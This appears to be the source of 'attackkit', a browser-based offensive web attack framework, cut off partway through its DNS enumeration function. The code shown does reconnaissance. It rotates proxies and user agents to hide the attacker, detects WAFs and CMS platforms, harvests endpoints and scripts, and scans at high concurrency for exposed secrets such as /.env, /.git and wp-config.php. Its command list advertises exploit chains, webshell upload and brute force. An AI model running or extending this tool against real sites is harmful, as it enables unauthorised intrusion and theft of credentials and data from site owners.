(() => {
  'use strict';
  const PKG = 'attackkit';
  const VERSION = '5.1.0';
  const KEY = `__kali_pkg_${PKG}`;
  const DEFAULTS = Object.freeze({
    proxy: '',
    timeout: 10000,
    maxConcurrentRequests: 500,
    retryBackoff: [500, 1500, 3000],
    delayBetweenRequests: 0,
    delayBetweenPhases: 0
  });
  const COMMANDS = Object.freeze([
    { name: 'attack', usage: 'attackkit attack <url>', description: 'Full multi-phase attack', group: 'attack' },
    { name: 'auto', usage: 'attackkit auto <url>', description: 'Auto exploit chain', group: 'attack' },
    { name: 'profile', usage: 'attackkit profile <url>', description: 'Deep profiling & reconnaissance', group: 'recon' },
    { name: 'crawl', usage: 'attackkit crawl <url>', description: 'Crawl internal links and endpoints', group: 'recon' },
    { name: 'dns', usage: 'attackkit dns <domain>', description: 'DNS enumeration', group: 'recon' },
    { name: 'subdomain', usage: 'attackkit subdomain <domain>', description: 'Subdomain enumeration', group: 'recon' },
    { name: 'cloud', usage: 'attackkit cloud <url>', description: 'Cloud metadata detection', group: 'recon' },
    { name: 'exploit', usage: 'attackkit exploit <url>', description: 'Exploit forms and endpoints', group: 'attack' },
    { name: 'upload', usage: 'attackkit upload <url>', description: 'Try webshell upload', group: 'attack' },
    { name: 'analyze', usage: 'attackkit analyze <url>', description: 'Analyze JS & secrets', group: 'attack' },
    { name: 'brute', usage: 'attackkit brute <url>', description: 'Server/db brute force', group: 'attack' },
    { name: 'cve', usage: 'attackkit cve <url>', description: 'Test known CVEs', group: 'attack' },
    { name: 'setproxy', usage: 'attackkit setproxy <template>', description: 'Set custom proxy (must contain {url})', group: 'config' },
    { name: 'help', usage: 'attackkit help', description: 'Help', group: 'docs' },
    { name: 'version', usage: 'attackkit version', description: 'Version', group: 'docs' }
  ]);
  const manifest = Object.freeze({
    name: PKG,
    version: VERSION,
    description: 'GodMode Ultimate – Guaranteed Attack Framework with DB Extraction & Strong XSS',
    author: 'Mobin Vaghar Jalaliyeh (Kali Light)',
    help: `${PKG} help`,
    official: false,
    default: false,
    securityLevel: 'high',
    permissions: Object.freeze({
      storage: 'none',
      cookies: 'none',
      network: 'required',
      filesystem: 'none'
    }),
    commands: Object.freeze([PKG]),
    dependencies: Object.freeze([]),
    entry: 'install'
  });
  const state = {
    api: null,
    settings: {
      ...DEFAULTS,
      retryBackoff: [...DEFAULTS.retryBackoff]
    },
    runtime: {
      visitedUrls: new Set(),
      stats: {
        phaseTimings: {},
        totalTime: 0,
        successCount: 0,
        failureCount: 0
      },
      cache: new Map(),
      proxyList: [],
      customProxy: null,
      proxyReady: false
    }
  };
  const escapeMap = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
  const safeHtml = value => String(value ?? '').replace(/[&<>"']/g, char => escapeMap[char]);
  const line = (text, cls = 'output') => ({ type: 'line', html: `<span class="${cls}">${safeHtml(text)}</span>` });
  const spacer = () => ({ type: 'spacer' });
  const fail = message => [line(message, 'danger')];
  const success = message => [line(message, 'success')];
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  const limitConcurrency = (tasks, limit) => new Promise((resolve) => {
    const results = new Array(tasks.length);
    let index = 0;
    let active = 0;
    const runNext = () => {
      while (active < limit && index < tasks.length) {
        const currentIndex = index++;
        active++;
        Promise.resolve()
          .then(() => tasks[currentIndex]())
          .then(result => {
            results[currentIndex] = result;
            active--;
            runNext();
          })
          .catch(err => {
            results[currentIndex] = err;
            active--;
            runNext();
          });
      }
      if (index >= tasks.length && active === 0) resolve(results);
    };
    runNext();
  });
  const runWithTimeout = async (url, options = {}) => {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), Math.max(1000, Number(state.settings.timeout) || DEFAULTS.timeout));
    try {
      return await fetch(url, { ...options, signal: controller.signal, mode: 'cors' });
    } finally {
      clearTimeout(timer);
    }
  };
  const proxied = (template, url) => {
    if (!template || typeof template !== 'string' || !template.includes('{url}')) {
      throw new Error('Invalid proxy template');
    }
    return template.replace('{url}', encodeURIComponent(String(url)));
  };
  const isPublicHost = (hostname) => {
    if (!hostname) return false;
    if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname === '::1') return false;
    if (/^10\./.test(hostname) || /^192\.168\./.test(hostname) || /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(hostname)) return false;
    if (hostname.endsWith('.local') || hostname.endsWith('.internal')) return false;
    return true;
  };
  function getFreeUserProxy() {
    try {
      return window.__FreeUserProxy || globalThis.__FreeUserProxy || null;
    } catch {
      return null;
    }
  }
  async function testCustomProxy(proxyTemplate, testUrl = 'https://httpbin.org/get') {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const url = proxied(proxyTemplate, testUrl);
      const res = await fetch(url, {
        method: 'HEAD',
        signal: controller.signal,
        mode: 'cors'
      });
      clearTimeout(timeout);
      return res.ok;
    } catch {
      return false;
    }
  }
  async function prepareProxyList(forceRefresh = false) {
    if (!forceRefresh && state.runtime.proxyReady && state.runtime.proxyList.length > 0) {
      return state.runtime.proxyList;
    }
    const fup = getFreeUserProxy();
    if (!fup || typeof fup.getWorkingProxies !== 'function') {
      throw new Error('FreeUserProxy is not available. Please ensure https://LightKALi.github.io/FreeUserProxy.js is loaded.');
    }
    let working = [];
    try {
      working = fup.getWorkingProxies() || [];
    } catch {
      working = [];
    }
    if (!Array.isArray(working)) working = [];
    if (state.runtime.customProxy && typeof state.runtime.customProxy === 'string' && state.runtime.customProxy.includes('{url}')) {
      const customOk = await testCustomProxy(state.runtime.customProxy);
      if (customOk) {
        const exists = working.some(p => p.template === state.runtime.customProxy);
        if (!exists) {
          working.push({ name: 'custom', template: state.runtime.customProxy });
        }
      }
    }
    if (working.length === 0) {
      throw new Error('No working proxies available. Please check your connection or set a custom proxy using "attackkit setproxy <template>" command.');
    }
    state.runtime.proxyList = working;
    state.runtime.proxyReady = true;
    return working;
  }
  let proxyIndex = 0;
  function getNextProxy() {
    if (state.runtime.proxyList.length === 0) {
      throw new Error('No proxy available. Call prepareProxyList first.');
    }
    const proxy = state.runtime.proxyList[proxyIndex % state.runtime.proxyList.length];
    proxyIndex = (proxyIndex + 1) % state.runtime.proxyList.length;
    return proxy;
  }
  function getRandomUserAgent() {
    const fup = getFreeUserProxy();
    if (fup && typeof fup.getRandomUserAgent === 'function') {
      return fup.getRandomUserAgent();
    }
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';
  }
  async function fetchWithRetry(url, options = {}) {
    if (!url || typeof url !== 'string') throw new Error('Invalid URL');
    let proxies = state.runtime.proxyList;
    if (proxies.length === 0) {
      proxies = await prepareProxyList();
    }
    const finalOptions = {
      ...options,
      headers: {
        'User-Agent': getRandomUserAgent(),
        ...(options.headers || {})
      }
    };
    const cacheKey = url + (options.method || 'GET') + (options.body || '');
    if ((options.method || 'GET') === 'GET' && state.runtime.cache.has(cacheKey)) {
      const cached = state.runtime.cache.get(cacheKey);
      if (Date.now() - cached.timestamp < 120000) return cached.response.clone();
      else state.runtime.cache.delete(cacheKey);
    }
    const maxAttempts = Math.min(proxies.length, 3);
    let lastError = null;
    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      const proxy = proxies[attempt % proxies.length];
      try {
        const proxyUrl = proxied(proxy.template, url);
        const res = await runWithTimeout(proxyUrl, finalOptions);
        if (res.ok || res.status < 400) {
          if ((options.method || 'GET') === 'GET') {
            state.runtime.cache.set(cacheKey, { response: res.clone(), timestamp: Date.now() });
          }
          return res;
        }
        if (res.status === 429) {
          await sleep(state.settings.retryBackoff[attempt % 3] || 1000);
        }
      } catch (err) {
        lastError = err;
      }
    }
    throw new Error(`Fetch failed for ${url}${lastError ? `: ${lastError.message}` : ''}`);
  }
  async function fetchText(url, options = {}) {
    const res = await fetchWithRetry(url, options);
    if (!res.ok && res.status >= 400) throw new Error(`HTTP ${res.status}`);
    return await res.text();
  }
  async function fetchJSON(url, options = {}) {
    const res = await fetchWithRetry(url, options);
    if (!res.ok && res.status >= 400) throw new Error(`HTTP ${res.status}`);
    return await res.json();
  }
  async function fetchHeadersObj(url) {
    let res;
    try {
      res = await fetchWithRetry(url, { method: 'HEAD' });
    } catch {
      res = await fetchWithRetry(url);
    }
    const headers = {};
    if (res && typeof res.headers.forEach === 'function') {
      res.headers.forEach((value, key) => { headers[key] = value; });
    }
    return headers;
  }
  const normalizeHeaders = headers => {
    const h = {};
    if (headers && typeof headers === 'object') {
      for (const [k, v] of Object.entries(headers)) {
        h[String(k).toLowerCase()] = { key: k, value: v };
      }
    }
    return h;
  };
  const headerValue = (headers, name) => headers[name.toLowerCase()]?.value || '';
  const hasHeader = (headers, name) => Object.prototype.hasOwnProperty.call(headers, name.toLowerCase());
  const findHeader = (headers, pattern) => {
    const regex = pattern instanceof RegExp ? pattern : new RegExp(`^${String(pattern).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');
    return Object.keys(headers).find(key => regex.test(key));
  };
  const resolveUrl = (url, baseUrl) => {
    try {
      return new URL(url, baseUrl).href;
    } catch {
      return null;
    }
  };
  const isInternalUrl = (url, targetOrigin) => {
    try {
      return new URL(url).origin === targetOrigin;
    } catch {
      return false;
    }
  };
  const normalizeTarget = (rawUrl) => {
    let normalized;
    try {
      normalized = new URL(rawUrl).href;
    } catch {
      normalized = `https://${rawUrl}`;
      try { new URL(normalized); } catch { throw new Error('Invalid URL'); }
    }
    if (!normalized.endsWith('/')) normalized += '/';
    return normalized;
  };
  function parseHTML(html) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const count = sel => doc.querySelectorAll(sel).length;
    const meta = name => doc.querySelector(`meta[name="${name}"]`)?.getAttribute('content') || '';
    const og = prop => doc.querySelector(`meta[property="${prop}"]`)?.getAttribute('content') || '';
    const links = [...doc.querySelectorAll('a[href]')].map(a => a.href);
    const scripts = [...doc.querySelectorAll('script[src]')].map(s => s.src);
    const forms = [...doc.querySelectorAll('form')].map((form, idx) => ({
      id: `form-${idx}`,
      action: form.action || '',
      method: (form.method || 'GET').toUpperCase(),
      inputs: [...form.querySelectorAll('input, textarea, select')].map(input => ({
        name: input.name || '',
        type: input.type || 'text',
        value: input.value || '',
        id: input.id || ''
      })),
      html: form.outerHTML
    }));
    return {
      title: doc.querySelector('title')?.textContent?.trim() || '(none)',
      metaDescription: meta('description'),
      metaKeywords: meta('keywords'),
      metaGenerator: meta('generator'),
      lang: doc.documentElement.lang || '',
      headings: { h1: count('h1'), h2: count('h2'), h3: count('h3'), h4: count('h4'), h5: count('h5'), h6: count('h6') },
      images: count('img'),
      links,
      scripts,
      inlineScripts: count('script:not([src])'),
      stylesheets: count('link[rel="stylesheet"]'),
      forms,
      ogTitle: og('og:title'),
      ogDescription: og('og:description'),
      ogImage: og('og:image')
    };
  }
  function detectTechnology(html, headers, docInfo) {
    const body = String(html || '').toLowerCase();
    const h = normalizeHeaders(headers);
    const found = new Map();
    const add = (cond, name, score = 1) => { if (cond) found.set(name, (found.get(name) || 0) + score); };
    add(hasHeader(h, 'server'), `Server: ${headerValue(h, 'server')}`, 2);
    add(hasHeader(h, 'x-powered-by'), `X-Powered-By: ${headerValue(h, 'x-powered-by')}`, 3);
    add(hasHeader(h, 'x-aspnet-version'), 'ASP.NET', 3);
    add(hasHeader(h, 'x-generator'), `Generator: ${headerValue(h, 'x-generator')}`, 3);
    add(hasHeader(h, 'x-drupal-cache'), 'Drupal', 3);
    add(hasHeader(h, 'x-joomla-version'), 'Joomla', 3);
    const metaGen = (docInfo.metaGenerator || '').toLowerCase();
    const cmsMap = {
      'wordpress': 'WordPress', 'joomla': 'Joomla', 'drupal': 'Drupal', 'magento': 'Magento',
      'shopify': 'Shopify', 'squarespace': 'Squarespace', 'wix': 'Wix', 'prestashop': 'PrestaShop',
      'opencart': 'OpenCart', 'ghost': 'Ghost', 'weebly': 'Weebly', 'blogger': 'Blogger',
      'typo3': 'TYPO3', 'craftcms': 'Craft CMS', 'modx': 'MODX', 'octobercms': 'October CMS',
      'hubspot': 'HubSpot', 'webflow': 'Webflow', 'duda': 'Duda', 'bigcommerce': 'BigCommerce',
      'salesforce': 'Salesforce Commerce Cloud'
    };
    for (const [key, name] of Object.entries(cmsMap)) add(metaGen.includes(key), name, 4);
    const bodyCmsPatterns = [
      ['wp-content/themes/', 'WordPress', 4], ['wp-includes/', 'WordPress', 4],
      ['sites/default/files/', 'Drupal', 4], ['media/jui/', 'Joomla', 4],
      ['skin/frontend/', 'Magento', 4], ['cdn.shopify.com', 'Shopify', 4],
      ['static.squarespace.com', 'Squarespace', 4], ['static.wixstatic.com', 'Wix', 4],
      ['catalog/view/theme/', 'OpenCart', 4], ['prestashop', 'PrestaShop', 4],
      ['typo3conf/', 'TYPO3', 4], ['craftcms', 'Craft CMS', 4],
      ['content/themes/', 'WordPress (custom theme)', 3], ['wp-json', 'WordPress REST API', 3]
    ];
    for (const [pattern, name, score] of bodyCmsPatterns) add(body.includes(pattern), name, score);
    const scriptSrcs = (docInfo.scripts || []).join(' ').toLowerCase();
    const jsLibPatterns = [
      ['jquery', 'jQuery', 2], ['react', 'React', 2], ['angular', 'Angular', 2], ['vue', 'Vue.js', 2],
      ['svelte', 'Svelte', 2], ['bootstrap', 'Bootstrap', 1], ['tailwindcss', 'Tailwind CSS', 1],
      ['font-awesome', 'Font Awesome', 1], ['moment.js', 'Moment.js', 1], ['chart.js', 'Chart.js', 1],
      ['three.js', 'Three.js', 1], ['socket.io', 'Socket.IO', 1], ['lodash', 'Lodash', 1],
      ['d3.js', 'D3.js', 1], ['gsap', 'GSAP', 1], ['alpinejs', 'Alpine.js', 1],
      ['next.js', 'Next.js', 3], ['nuxt.js', 'Nuxt.js', 3], ['gatsby', 'Gatsby', 3],
      ['ember', 'Ember.js', 2], ['backbone', 'Backbone.js', 2], ['meteor', 'Meteor', 2],
      ['polymer', 'Polymer', 2], ['flutter', 'Flutter', 2], ['electron', 'Electron', 1]
    ];
    for (const [pattern, name, score] of jsLibPatterns) {
      const inScript = scriptSrcs.includes(pattern);
      const inBody = body.includes(pattern);
      if (inScript) add(true, name, score * 2);
      else if (inBody) add(true, name, score);
    }
    const analyticsPatterns = [
      ['googletagmanager', 'Google Tag Manager', 2], ['gtag', 'Google Analytics', 2],
      ['googlesyndication', 'Google AdSense', 2], ['adsbygoogle', 'Google AdSense', 2],
      ['facebook.net', 'Facebook Pixel', 2], ['connect.facebook', 'Facebook Pixel', 2],
      ['hotjar', 'Hotjar', 2], ['intercom', 'Intercom', 2], ['mixpanel', 'Mixpanel', 2],
      ['segment', 'Segment', 2], ['amplitude', 'Amplitude', 2], ['linkedin', 'LinkedIn Insights', 2],
      ['twitter', 'Twitter Pixel', 2], ['pinterest', 'Pinterest Tag', 2], ['quora', 'Quora Pixel', 2],
      ['tiktok', 'TikTok Pixel', 2]
    ];
    for (const [pattern, name, score] of analyticsPatterns) add(scriptSrcs.includes(pattern), name, score);
    const cdnPatterns = [
      ['cloudflare', 'Cloudflare', 3], ['akamai', 'Akamai', 3], ['fastly', 'Fastly', 3],
      ['cloudfront', 'AWS CloudFront', 3], ['netlify', 'Netlify', 3], ['vercel', 'Vercel', 3],
      ['github.io', 'GitHub Pages', 3], ['gitlab.io', 'GitLab Pages', 3], ['firebase', 'Firebase', 2],
      ['supabase', 'Supabase', 2], ['heroku', 'Heroku', 2], ['amazonaws', 'AWS', 2],
      ['digitalocean', 'DigitalOcean', 2], ['linode', 'Linode', 2], ['azure', 'Microsoft Azure', 2],
      ['googleusercontent', 'Google Cloud', 2]
    ];
    for (const [pattern, name, score] of cdnPatterns) add(scriptSrcs.includes(pattern) || body.includes(pattern) || hasHeader(h, pattern), name, score);
    add(hasHeader(h, 'cf-ray'), 'Cloudflare', 5);
    add(hasHeader(h, 'x-amz-cf-id'), 'AWS CloudFront', 5);
    add(hasHeader(h, 'x-akamai-transformed'), 'Akamai', 5);
    add(hasHeader(h, 'x-served-by') && hasHeader(h, 'x-cache'), 'Fastly', 5);
    add(hasHeader(h, 'x-vercel-cache'), 'Vercel', 5);
    add(hasHeader(h, 'x-netlify-request-id'), 'Netlify', 5);
    add(hasHeader(h, 'x-azure-ref'), 'Microsoft Azure', 5);
    const wafMap = {
      'cf-ray': 'Cloudflare WAF', 'x-sucuri-id': 'Sucuri WAF', 'x-iinfo': 'Imperva/Incapsula WAF',
      'x-amz-cf-id': 'AWS WAF', 'x-akamai-transformed': 'Akamai WAF', 'x-f5-': 'F5 BIG-IP WAF',
      'x-fortigate-': 'Fortinet WAF', 'x-barracuda-': 'Barracuda WAF', 'x-wallarm': 'Wallarm WAF',
      'x-cloudfront': 'AWS CloudFront WAF', 'x-modsecurity': 'ModSecurity WAF', 'x-sucuri-cache': 'Sucuri WAF'
    };
    for (const [headerPrefix, wafName] of Object.entries(wafMap)) add(findHeader(h, new RegExp(headerPrefix, 'i')), wafName, 5);
    const cookies = (headers['set-cookie'] || headers['Set-Cookie'] || '').toLowerCase();
    const cookieTechMap = {
      'laravel_session': 'Laravel', 'phpsessid': 'PHP', 'asp.net_sessionid': 'ASP.NET',
      'jsessionid': 'Java', 'csrftoken': 'Django', 'connect.sid': 'Express.js',
      'wordpress_logged_in': 'WordPress', 'woocommerce': 'WooCommerce', 'shopify': 'Shopify',
      'prestashop': 'PrestaShop', 'magento': 'Magento', 'craftsessionid': 'Craft CMS',
      'october_session': 'October CMS', 'sails.sid': 'Sails.js', 'koa.sid': 'Koa.js'
    };
    for (const [cookie, name] of Object.entries(cookieTechMap)) add(cookies.includes(cookie), name, 4);
    const threshold = 2;
    return [...found.entries()].filter(([name, score]) => score >= threshold).sort((a, b) => b[1] - a[1]).map(([name]) => name);
  }
  function detectWAF(headersObj, html) {
    const headers = normalizeHeaders(headersObj);
    const body = String(html || '');
    const found = new Set();
    const add = (condition, name) => { if (condition) found.add(name); };
    add(hasHeader(headers, 'cf-ray') || body.includes('cf-browser-verification'), 'Cloudflare');
    add(hasHeader(headers, 'x-sucuri-id') || body.includes('sucuri/cloudproxy'), 'Sucuri');
    add(hasHeader(headers, 'x-iinfo'), 'Imperva/Incapsula');
    add(hasHeader(headers, 'x-amz-cf-id'), 'AWS WAF');
    add(hasHeader(headers, 'x-akamai-transformed'), 'Akamai');
    add(findHeader(headers, /^x-f5-/i), 'F5 BIG-IP');
    add(findHeader(headers, /^x-fortigate-/i), 'Fortinet');
    add(findHeader(headers, /^x-barracuda-/i), 'Barracuda');
    add(hasHeader(headers, 'x-wallarm'), 'Wallarm');
    add(hasHeader(headers, 'x-modsecurity'), 'ModSecurity');
    add(hasHeader(headers, 'x-sucuri-cache'), 'Sucuri');
    return [...found].length ? [...found] : ['None'];
  }
  function fingerprintCMS(technology) {
    const cmsList = technology.filter(t => [
      'WordPress', 'Drupal', 'Joomla', 'Magento', 'Shopify', 'Squarespace', 'Wix',
      'PrestaShop', 'OpenCart', 'Ghost', 'Weebly', 'Blogger', 'TYPO3', 'Craft CMS',
      'MODX', 'October CMS', 'HubSpot', 'Webflow', 'Duda', 'BigCommerce', 'Salesforce Commerce Cloud'
    ].includes(t));
    return cmsList.length ? cmsList.sort() : [];
  }
  function classifyPurpose(html, docInfo, forms, url) {
    const body = String(html).toLowerCase();
    const purposes = new Set();
    const hasFormType = type => forms.some(f => classifyFormType(f) === type);
    let path = '';
    try { path = new URL(url).pathname.toLowerCase(); } catch { }
    if (path.includes('/admin') || path.includes('/dashboard')) purposes.add('admin-panel');
    if (path.includes('/login') || path.includes('/signin')) purposes.add('login-panel');
    if (path.includes('/register') || path.includes('/signup')) purposes.add('registration');
    if (path.includes('/upload')) purposes.add('file-upload');
    if (path.includes('/search')) purposes.add('search');
    if (path.includes('/api') || path.includes('/rest') || path.includes('/graphql')) purposes.add('api');
    if (hasFormType('search')) purposes.add('search');
    if (hasFormType('login')) purposes.add('login-panel');
    if (hasFormType('comment')) purposes.add('comment-enabled');
    if (hasFormType('upload')) purposes.add('file-upload');
    if (hasFormType('contact')) purposes.add('contact');
    if (hasFormType('registration')) purposes.add('registration');
    if (body.includes('add to cart') || body.includes('checkout') || body.includes('product') || body.includes('shop')) purposes.add('e-commerce');
    if (body.includes('blog') || body.includes('post') || body.includes('article')) purposes.add('blog');
    if (body.includes('forum') || body.includes('thread')) purposes.add('forum');
    if (body.includes('comment') || body.includes('reply')) purposes.add('comment-enabled');
    if (body.includes('search') || body.includes('query')) purposes.add('search');
    if (body.includes('upload') || body.includes('file')) purposes.add('file-upload');
    if (body.includes('api') || body.includes('endpoint')) purposes.add('api');
    if (purposes.size === 0) purposes.add('general');
    return [...purposes].sort();
  }
  function extractEndpoints(html, baseUrl) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const endpoints = new Set();
    const suspiciousPaths = new Set([
      'admin', 'login', 'wp-login', 'dashboard', 'upload', 'api', 'phpmyadmin',
      'wp-admin', 'administrator', 'backup', 'config', 'settings', 'private',
      'hidden', 'debug', 'test', 'old', 'new', 'beta', 'dev', 'staging',
      'graphql', 'rest', 'oauth', 'token', 'password', 'cgi-bin', 'webdav',
      'phpinfo', 'server-status', 'actuator', 'swagger', 'metrics', '.env',
      '.git', 'wp-config.php', 'phpinfo.php'
    ]);
    const staticExtensions = /\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|mp4|webm|mp3|pdf|zip|tar|gz|rar)$/i;
    const addEndpoint = (href) => {
      if (!href || typeof href !== 'string') return;
      const resolved = resolveUrl(href, baseUrl);
      if (!resolved) return;
      try {
        const url = new URL(resolved);
        if (!['http:', 'https:'].includes(url.protocol)) return;
        if (!isPublicHost(url.hostname)) return;
        const pathLower = url.pathname.toLowerCase();
        const hasSuspicious = [...suspiciousPaths].some(sp => pathLower.includes(sp));
        if (staticExtensions.test(url.pathname) && !hasSuspicious) return;
        endpoints.add(url.href);
        if (hasSuspicious) endpoints.add(`SUSPICIOUS: ${url.href}`);
      } catch { }
    };
    doc.querySelectorAll('a[href], script[src], form[action], link[href], img[src], iframe[src], source[src], video[src], audio[src]').forEach(el => {
      addEndpoint(el.href || el.src || el.action);
    });
    const inlineScripts = [...doc.querySelectorAll('script:not([src])')].map(s => s.textContent || '').join('\n');
    const allText = html + '\n' + inlineScripts;
    const urlRegex = /(?:https?:\/\/|\/\/)[^\s"'<>]+/g;
    const matches = allText.match(urlRegex) || [];
    for (const match of matches) if (match.length < 300) addEndpoint(match);
    return [...endpoints].sort();
  }
  function detectLanguage(headers, html, docInfo) {
    const h = normalizeHeaders(headers);
    const xpb = headerValue(h, 'x-powered-by').toLowerCase();
    const server = headerValue(h, 'server').toLowerCase();
    const body = String(html).toLowerCase();
    const found = new Set();
    const lang = docInfo.lang || '';
    const langMap = [
      ['fa', 'Persian (Farsi)'], ['ar', 'Arabic'], ['en', 'English'], ['zh', 'Chinese'],
      ['ru', 'Russian'], ['de', 'German'], ['fr', 'French'], ['es', 'Spanish'],
      ['pt', 'Portuguese'], ['it', 'Italian'], ['nl', 'Dutch'], ['ja', 'Japanese'],
      ['ko', 'Korean'], ['tr', 'Turkish']
    ];
    for (const [code, name] of langMap) if (lang.startsWith(code)) found.add(name);
    if (xpb.includes('php') || body.includes('.php') || body.includes('php')) found.add('PHP');
    if (xpb.includes('asp.net') || server.includes('iis') || body.includes('.aspx') || body.includes('asp.net')) found.add('ASP.NET');
    if (server.includes('express') || body.includes('node.js') || body.includes('__next')) found.add('Node.js');
    if (xpb.includes('python') || server.includes('django') || server.includes('flask') || body.includes('django')) found.add('Python');
    if (xpb.includes('java') || server.includes('tomcat') || body.includes('.jsp')) found.add('Java');
    if (body.includes('ruby') || server.includes('rails')) found.add('Ruby');
    if (body.includes('.php')) found.add('PHP');
    if (body.includes('.aspx')) found.add('ASP.NET');
    if (body.includes('.jsp')) found.add('Java');
    if (found.size === 0) found.add('unknown');
    return [...found].sort();
  }
  async function crawlJSFiles(html, baseUrl) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const scriptSrcs = [...doc.querySelectorAll('script[src]')].map(s => s.src).filter(src => src && typeof src === 'string');
    const jsFiles = [];
    const tasks = scriptSrcs.map(src => async () => {
      const resolved = resolveUrl(src, baseUrl);
      if (!resolved) return null;
      try {
        const url = new URL(resolved);
        if (!['http:', 'https:'].includes(url.protocol)) return null;
        if (!isPublicHost(url.hostname)) return null;
        const content = await fetchText(url);
        return { url: String(url), content, fetched: true };
      } catch {
        return { url: String(resolved), content: null, fetched: false };
      }
    });
    const results = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of results) if (result && typeof result.url === 'string' && (result.fetched || result.content !== undefined)) jsFiles.push(result);
    doc.querySelectorAll('script:not([src])').forEach((s, i) => {
      const content = s.textContent || '';
      if (content.trim()) jsFiles.push({ url: `inline-${i}`, content, fetched: true });
    });
    return jsFiles;
  }
  async function crawlCSSandMaps(html, baseUrl) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const cssLinks = [...doc.querySelectorAll('link[rel="stylesheet"]')].map(l => l.href).filter(h => h && typeof h === 'string');
    const jsSrcs = [...doc.querySelectorAll('script[src]')].map(s => s.src).filter(src => src && typeof src === 'string');
    const maps = [];
    const cssTasks = cssLinks.map(css => async () => {
      const resolved = resolveUrl(css, baseUrl);
      if (!resolved) return;
      try {
        const cssUrl = new URL(resolved);
        if (!['http:', 'https:'].includes(cssUrl.protocol)) return;
        if (!isPublicHost(cssUrl.hostname)) return;
        const cssContent = await fetchText(cssUrl);
        const mapMatch = cssContent.match(/\/\*# sourceMappingURL=(.*?) \*\//);
        if (mapMatch) maps.push(resolveUrl(mapMatch[1], cssUrl) || mapMatch[1]);
      } catch { }
    });
    const jsTasks = jsSrcs.map(js => async () => {
      const resolved = resolveUrl(js, baseUrl);
      if (!resolved) return;
      try {
        const jsUrl = new URL(resolved);
        if (!['http:', 'https:'].includes(jsUrl.protocol)) return;
        if (!isPublicHost(jsUrl.hostname)) return;
        const jsContent = await fetchText(jsUrl);
        const mapMatch = jsContent.match(/\/\/# sourceMappingURL=(.*?)(?:\n|$)/);
        if (mapMatch) maps.push(resolveUrl(mapMatch[1], jsUrl) || mapMatch[1]);
      } catch { }
    });
    await Promise.all([
      limitConcurrency(cssTasks, state.settings.maxConcurrentRequests),
      limitConcurrency(jsTasks, state.settings.maxConcurrentRequests)
    ]);
    return maps;
  }
  async function activePathScan(baseUrl, domain) {
    const commonPaths = [
      '/admin', '/login', '/wp-admin', '/wp-login.php', '/phpinfo.php', '/phpmyadmin',
      '/.env', '/.git', '/config.php', '/backup', '/backup.zip', '/uploads',
      '/robots.txt', '/sitemap.xml', '/server-status', '/actuator', '/actuator/env',
      '/swagger-ui.html', '/graphql', '/rest', '/api', '/api/v1', '/api/v2',
      '/console', '/manager/html', '/debug', '/test', '/old', '/new', '/beta',
      '/dev', '/staging', '/web.config', '/WEB-INF/web.xml', '/error', '/errors'
    ];
    const found = [];
    const tasks = commonPaths.map(path => async () => {
      const url = resolveUrl(path, baseUrl);
      if (!url) return null;
      try {
        let res = await fetchWithRetry(url, { method: 'HEAD' });
        if (!res.ok && res.status !== 403) res = await fetchWithRetry(url, { method: 'GET' });
        if (res.ok || res.status < 400) return { url, status: res.status, contentLength: res.headers.get('content-length') || 'unknown' };
        else if (res.status === 403) return { url, status: 403, note: 'forbidden (exists but access denied)' };
      } catch { }
      return null;
    });
    const results = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const result of results) if (result) found.push(result);
    return found;
  }
  async function crawlInternalLinks(startUrl, baseUrl, maxDepth = 2) {
    const visited = new Set(state.runtime.visitedUrls);
    const queue = [{ url: startUrl, depth: 0 }];
    const discovered = [];
    while (queue.length > 0) {
      const currentBatch = [];
      while (queue.length > 0 && currentBatch.length < state.settings.maxConcurrentRequests) {
        const item = queue.shift();
        if (visited.has(item.url) || item.depth > maxDepth) continue;
        visited.add(item.url);
        state.runtime.visitedUrls.add(item.url);
        currentBatch.push(item);
      }
      if (currentBatch.length === 0) break;
      const tasks = currentBatch.map(({ url, depth }) => async () => {
        try {
          const html = await fetchText(url);
          const doc = new DOMParser().parseFromString(html, 'text/html');
          const links = [...doc.querySelectorAll('a[href]')]
            .map(a => resolveUrl(a.href, url))
            .filter(link => {
              if (!link) return false;
              try {
                const parsed = new URL(link);
                return isPublicHost(parsed.hostname) && parsed.origin === new URL(baseUrl).origin;
              } catch { return false; }
            });
          return { url, depth, links };
        } catch {
          return null;
        }
      });
      const results = await Promise.all(tasks.map(t => t()));
      for (const res of results) {
        if (!res) continue;
        for (const link of res.links) {
          if (!visited.has(link)) {
            discovered.push(link);
            if (res.depth < maxDepth) queue.push({ url: link, depth: res.depth + 1 });
          }
        }
      }
    }
    return discovered;
  }
  async function dnsEnumeration(domain) {
    const results = { A: [], AAAA: [], MX: [], NS: [], CNAME: [], TXT: [], SOA: [], SRV: [], CAA: [], SPF: [], DMARC: [], DKIM: [], zoneTransfer: null, dnssec: false };
    const fetchDns = async (name, type) => {
      try {
        const apiUrl = `https://dns.google/resolve?name=${encodeURIComponent(name)}&type=${type}`;
        const data = await fetchJSON(apiUrl);
        return (data.Answer || []).map(r => ({ name: r.name, type: r.type, data: r.data, TTL: r.TTL }));
      } catch {
        return [];
      }
    };
    try {
      const [a, aaaa, mx, ns, cname, txt, soa, srv, caa] = await Promise.all([
        fetchDns(domain, 'A'), fetchDns(domain, 'AAAA'), fetchDns(domain, 'MX'),
        fetchDns(domain, 'NS'), fetchDns(domain, 'CNAME'), fetchDns(domain, 'TXT'),
        fetchDns(domain, 'SOA'), fetchDns(domain, 'SRV'), fetchDns(domain, 'CAA')
      ]);
